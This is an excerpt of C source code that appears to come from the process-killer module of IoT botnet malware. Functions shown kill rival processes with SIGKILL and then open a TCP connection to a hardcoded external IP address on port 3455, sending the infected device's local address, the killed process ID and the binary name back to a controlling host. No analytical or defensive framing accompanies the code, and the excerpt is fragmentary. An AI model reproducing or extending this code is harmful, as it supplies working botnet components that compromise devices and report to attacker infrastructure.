...
#endif
            killer_fetchback(file->d_name, value);
            kill(pid, 9);
        }
...
void killer_fetchback(char *pid, char *bin) {
#ifdef DEBUG
    printf("[killer] fetching pid: %s bin: %s\n", pid, bin);
#endif

    util_local_addr2();

#ifdef DEBUG
    printf("[killer] sending back to host %s\n", "23.254.230.120");
#endif

    int socketToConnect = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(3455);
    addr.sin_addr.s_addr = inet_addr("23.254.230.120");

    if(connect(socketToConnect, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) != -1) {
#ifdef DEBUG
        printf("[killer] connected to parent sending killed bin\n");
#endif
        stringsendtohost(localAddr, pid, bin);
        send(socketToConnect, sendbacktoHost, strlen(sendbacktoHost), MSG_NOSIGNAL);
        sleep(1);
